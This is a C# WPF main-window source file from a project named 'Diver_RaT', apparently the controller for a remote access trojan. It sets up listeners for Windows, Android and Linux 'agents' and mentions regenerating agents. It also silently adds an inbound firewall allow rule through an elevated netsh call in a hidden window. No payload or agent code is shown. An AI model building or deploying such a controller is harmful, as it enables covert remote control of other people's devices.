using System;
using System.Linq;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace Diver_RaT
{
    public partial class MainWindow : Window
    {
        private int _listenerBasePort;

        public MainWindow()
        {
            InitializeComponent();
            _listenerBasePort = ControllerSettings.Port;
            HookServerLog(WindowsContent);
            HookServerLog(AndroidContent);
            HookServerLog(LinuxContent);
            WindowsContent.Initialize(_listenerBasePort, DeviceKind.Windows);
            AndroidContent.Initialize(_listenerBasePort + 1, DeviceKind.Android);
            LinuxContent.Initialize(_listenerBasePort + 2, DeviceKind.Linux);
            UpdateStatus();
            EnsureFirewallRule();
        }

        private void HookServerLog(DeviceTabContent content)
        {
            content.ServerLog += m => Dispatcher.Invoke(() =>
            {
                EventText.Text = $"[{DateTime.Now:HH:mm:ss}] port {content.ListenerPort}: {m}";
            });
        }

        private void EnsureFirewallRule()
        {
            // Register an inbound firewall rule for this controller exe so Android/agent devices
            // can connect. Best-effort: needs admin, so it runs via UAC prompt the first time.
            try
            {
                var exe = Environment.ProcessPath;
                if (string.IsNullOrEmpty(exe) || !System.IO.File.Exists(exe)) return;
                var psi = new System.Diagnostics.ProcessStartInfo("netsh")
                {
                    UseShellExecute = true,
                    Verb = "runas",
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                    Arguments = $"advfirewall firewall add rule name=\"Diver RaT Inbound\" dir=in action=allow program=\"{exe}\" enable=yes profile=any"
                };
                using var p = System.Diagnostics.Process.Start(psi);
            }
            catch
            {
                // not elevated - skip; user can allow via the OS prompt or run as admin once
            }
        }

        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ButtonState != MouseButtonState.Pressed) return;
            if (e.ClickCount == 2)
            {
                WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
                return;
            }
            try
            {
                if (WindowState == WindowState.Maximized)
                {
                    var pos = PointToScreen(e.GetPosition(this));
                    WindowState = WindowState.Normal;
                    try { Left = pos.X - Width / 2; Top = pos.Y - 6; } catch { }
                }
                DragMove();
            }
            catch
            {
            }
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();

        private void SettingsButton_Click(object sender, RoutedEventArgs e)
        {
            var settings = new SettingsWindow { Owner = this };
            settings.ShowDialog();
            if (ControllerSettings.Port != _listenerBasePort)
            {
                _listenerBasePort = ControllerSettings.Port;
                WindowsContent.RestartListener(_listenerBasePort);
                AndroidContent.RestartListener(_listenerBasePort + 1);
                LinuxContent.RestartListener(_listenerBasePort + 2);
                StatusText.Text = $"Listeners moved to base port {_listenerBasePort} (Android {_listenerBasePort + 1}, Linux {_listenerBasePort + 2}). Regenerate agents with the new ports.";
            }
        }

        private void MainTabs_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (WindowsContent is null || AndroidContent is null || LinuxContent is null) return;
            switch (MainTabs.SelectedIndex)
            {
                case 0:
                    WindowsContent.Visibility = Visibility.Visible;
                    AndroidContent.Visibility = Visibility.Collapsed;
                    LinuxContent.Visibility = Visibility.Collapsed;
                    break;
                case 1:
                    WindowsContent.Visibility = Visibility.Collapsed;
                    AndroidContent.Visibility = Visibility.Visible;
                    LinuxContent.Visibility = Visibility.Collapsed;
                    break;
                default:
                    WindowsContent.Visibility = Visibility.Collapsed;
                    AndroidContent.Visibility = Visibility.Collapsed;
                    LinuxContent.Visibility = Visibility.Visible;
                    break;
            }
            UpdateStatus();
        }

        private void UpdateStatus()
        {
            var ip = string.IsNullOrWhiteSpace(ControllerSettings.Ip) ? GetLocalIpv4() : ControllerSettings.Ip;
            var idx = MainTabs?.SelectedIndex ?? 0;
            (int port, string label, bool listening) = idx switch
            {
                1 => (_listenerBasePort + 1, "Android", AndroidContent.IsListening),
                2 => (_listenerBasePort + 2, "Linux", LinuxContent.IsListening),
                _ => (_listenerBasePort, "Windows", WindowsContent.IsListening)
            };
            StatusText.Text = listening
                ? $"{label} listener on {ip}:{port} - awaiting agents"
                : $"WARNING: {label} listener FAILED to bind on port {port} - check the port is free and not used by another app";
        }

        private static string GetLocalIpv4()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var ip = host.AddressList
                    .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !IPAddress.IsLoopback(a));
                return ip?.ToString() ?? "0.0.0.0";
            }
            catch
            {
                return "0.0.0.0";
            }
        }
    }
}